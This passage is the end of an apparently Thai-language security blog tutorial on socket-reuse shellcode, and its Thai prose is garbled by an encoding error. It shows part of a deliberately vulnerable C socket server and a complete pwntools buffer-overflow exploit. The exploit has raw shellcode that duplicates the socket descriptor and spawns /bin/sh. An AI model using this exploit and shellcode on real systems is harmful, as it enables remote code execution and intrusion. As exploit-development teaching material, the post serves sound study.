	struct sockaddr sock;
     struct sockaddr_in serv_addr, cli_addr;
     int n;
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd &lt; 0) 
        error(&quot;ERROR opening socket&quot;);
     bzero((char *) &amp;serv_addr, sizeof(serv_addr));
     portno = 1337;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);
     if (bind(sockfd, (struct sockaddr *) &amp;serv_addr,
              sizeof(serv_addr)) &lt; 0) 
              error(&quot;ERROR on binding&quot;);
	printf(&quot;\n\n Server socket number is %d\n\n&quot;,sockfd);
     listen(sockfd,5);

     clilen = sizeof(cli_addr);
     newsockfd = accept(sockfd, 
                 (struct sockaddr *) &amp;cli_addr, 
                 &amp;clilen);
	printf(&quot;\n\n Client socket number is %d\n\n&quot;,newsockfd);
     if (newsockfd &lt; 0) 
          error(&quot;ERROR on accept&quot;);
     while (1) {
        greet(newsockfd);
        }
     close(newsockfd);
     close(sockfd);
     return 0; 
}
</code></pre>
<p>‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏£‡∏≤‡∏•‡∏≠‡∏á‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô <a href="https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce#file-03_exploit-py">exploit.py</a> ‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö</p>
<pre><code class="language-python">from pwn import *

def exp():
    p = remote(&quot;localhost&quot;, 1337)

    p.recvuntil(&quot;: &quot;)
    client_addr = int(p.recvline()[:-1], 16)
    print(f&quot;Buffer Address: {hex(client_addr)}&quot;)
    # p.recvuntil(&quot;: &quot;)

    sc = b&quot;\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
    buf =b&quot;&quot;
    buf += b&quot;\x90&quot;*200
    buf += sc
    buf += b&quot;\x90&quot;*(0xa00-len(buf))
    buf += b&quot;B&quot;*8
    buf += p64(client_addr+150)
    buf += b&quot;D&quot;*20

    p.sendline(buf)

    p.interactive()
exp()
</code></pre>
<p>‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏£‡∏≤‡∏•‡∏≠‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏£‡∏±‡∏ô Exploit ‡∏Å‡πá‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö shell ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡∏ú‡πà‡∏≤‡∏ô sockfd ‡∏Ç‡∏≠‡∏á socket ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡πÉ‡∏ä‡πâ‡πÇ‡∏à‡∏°‡∏ï‡∏µ ‡πÇ‡∏î‡∏¢‡∏ó‡∏µ‡πà‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏î‡∏π‡∏Ñ‡πà‡∏≤ FD ‡∏Ç‡∏≠‡∏á Process ‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤‡∏°‡∏±‡∏ô‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡πÑ‡∏õ‡∏ó‡∏µ‡πà FD ‡∏Ç‡∏≠‡∏á Socket ‡πÄ‡∏£‡∏≤‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏≠‡∏á (‡∏ï‡∏£‡∏á‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏•‡∏Ç 1)</p>
<p><img src="https://i.imgur.com/byYFTtX.png" alt=""></p>
<p>Code ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏µ‡πà Gist ‡∏ô‡∏µ‡πâ‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö‡∏ö</p>
<p><a href="https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce">Socket-reuse-Linux-x86-64.asm</a></p>
<p>‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏ö‡∏ó‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ô‡∏µ‡πâ‡∏Å‡πá‡∏à‡∏ö‡πÅ‡∏Ñ‡πà‡∏ô‡∏µ‡πâ‡∏Ñ‡πâ‡∏≤‡∏ö ‡∏ñ‡πâ‡∏≤‡∏™‡∏á‡∏™‡∏±‡∏¢‡∏ï‡∏£‡∏á‡πÑ‡∏´‡∏ô‡πÑ‡∏õ‡∏ñ‡∏≤‡∏° <a href="https://web.facebook.com/bank.eakasit">@Bankie</a> ‡∏ô‡∏∞‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ó‡∏±‡∏Å‡πÑ‡∏õ‡πÑ‡∏î‡πâ 24 hr ‡πÄ‡∏ö‡∏¢‡∏¢‡∏¢</p>
<p>‡∏Ç‡∏≠‡∏ö‡∏Ñ‡∏∏‡∏ì‡∏ó‡∏µ‡πà‡∏≠‡πà‡∏≤‡∏ô‡∏à‡∏ô‡∏à‡∏ö‡∏Ñ‡πâ‡∏≤‡∏ö ‡∏ñ‡πâ‡∏≤‡πÉ‡∏Ñ‡∏£‡∏≠‡πà‡∏≤‡∏ô‡πÅ‡∏•‡πâ‡∏ß‡∏á‡∏á ‡πÜ ‡∏ï‡∏£‡∏á‡πÑ‡∏´‡∏ô‡∏Å‡πá‡∏™‡∏π‡πâ ‡πÜ ‡πÅ‡∏•‡πâ‡∏ß‡∏Å‡∏±‡∏ô(‡∏´‡∏¢‡∏≠‡∏Å‡πÜ‡πÜ) ‡∏ú‡∏°‡∏≠‡∏≤‡∏à‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏°‡πà‡∏Ñ‡πà‡∏≠‡∏¢‡∏î‡∏µ‡πÄ‡∏ó‡πà‡∏≤‡πÑ‡∏£‡∏Ñ‡πâ‡∏≤‡∏ö‡πÄ‡∏•‡∏¢‡∏á‡∏á ‡∏°‡∏µ‡∏≠‡∏∞‡πÑ‡∏£‡πÅ‡∏ô‡∏∞‡∏ô‡∏≥‡∏Å‡∏±‡∏ô‡πÑ‡∏î‡πâ‡∏´‡∏£‡∏∑‡∏≠‡∏ñ‡πâ‡∏≤‡∏ú‡∏¥‡∏î‡∏ï‡∏£‡∏á‡πÑ‡∏´‡∏ô‡∏Å‡πá‡∏ö‡∏≠‡∏Å‡πÑ‡∏î‡πâ‡πÄ‡∏•‡∏¢‡∏ô‡∏∞‡∏Ñ‡∏£‡∏±‡∏ö ‡∏¢‡∏¥‡∏ô‡∏î‡∏µ‡∏°‡∏≤‡∏Å ‡πÜ ‡∏à‡∏∞‡πÄ‡∏≠‡∏≤‡πÑ‡∏õ‡∏õ‡∏£‡∏±‡∏ö‡∏õ‡∏£‡∏∏‡∏á ‚ù§</p>
<p>‡∏Ç‡∏≠‡∏ö‡∏Ñ‡∏∏‡∏ì‡πÄ‡∏ó‡∏û <a href="https://suam.wtf/authors/bongtrop/">@Bongtrop</a> ‡∏ó‡∏µ‡πà‡∏ä‡πà‡∏ß‡∏¢‡∏î‡∏π‡∏ö‡∏ó‡∏Ñ‡∏ß‡∏≤‡∏°‡πÉ‡∏´‡πâ‡∏Ñ‡∏£‡∏±‡∏ö ‡∏Å‡∏£‡∏≤‡∏ö‡∏á‡∏≤‡∏° ‡πÜ ‡∏™‡∏±‡∏Å‡∏™‡∏≤‡∏°‡∏ó‡∏µ‡∏Ñ‡∏£‡∏±‡∏û</p>
<p>‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢‡πÅ‡∏•‡πâ‡∏ß‡∏Å‡πá‡∏ù‡∏≤‡∏Å‡πÑ‡∏ß‡πâ‡∏õ‡∏£‡∏∞‡πÇ‡∏¢‡∏Ñ‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Ñ‡πâ‡∏≤‡∏ö</p>
<blockquote>
<p>UV ‡πÑ‡∏°‡πà‡∏î‡∏µ‡∏ï‡πà‡∏≠‡∏ú‡∏¥‡∏ß ‡πÅ‡∏ï‡πà U so cute ‡πÑ‡∏°‡πà‡∏î‡∏µ‡∏ï‡πà‡∏≠‡∏à‡∏±‡∏¢‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö‡∏ö</p>
</blockquote>
<p><strong>‡∏ö‡∏£‡∏±‡∏¢</strong></p>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/">Linux x86 One-Way Shellcode. (Socket Reuse)</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Linux System Call Table</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">getpeername(2) - Linux manual page</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">dup(2) - Linux manual page</a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-806.php">Linux/x86-64 - Execute /bin/sh - 27 bytes</a></li>
</ul>

                        </div>
                    </div>
                </div>

                <div class="row justify-content-center">
                    <div class="col-lg-8">
                        
                    </div>
                </div></article>
        </div>
    </div>

    
</main>


    <footer class="footer text-center bg-dark py-2">
    <div class="container">
        <div class="row">
            <div class="col">
                <ul class="list-inline">
                    
                </ul>

                <p class="text-muted">
                    
                        Copyright &copy; SUAM 2023
                    
                </p>

                <p class="text-muted">
                Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with <a href="https://github.com/puresyntax71/hugo-theme-chunky-poster" target="_blank">Chunky Poster</a>.
                </p>
            </div>
        </div>
    </div>
</footer>

    
    
        
            <script src="/dist/app.js"></script>
        
    
        
            <script src="/dist/lazyload.js"></script>
        
    
        
            <script src="/dist/main.js"></script>
        
    
        
            <script src="/dist/vendors~app.js"></script>
        
    
        
            <script src="/dist/vendors~app~bootstrap.js"></script>
        
    
        
            <script src="/dist/vendors~bootstrap.js"></script>
        
    
        
            <script src="/dist/vendors~ekkoLightbox.js"></script>
        
    



<script>
    window.Prism = window.Prism || {};
    window.Prism.manual = true;
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>



<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
<script>
document.body.onload = () => {
    renderMathInElement(document.body, {
        delimiters: [
            {left: "$$", right: "$$", display: true},
            {left: "\\[", right: "\\]", display: true},
            {left: "$", right: "$", display: false},
            {left: "\\(", right: "\\)", display: false}
        ]
    });
};
</script>






    
</body>
</html>
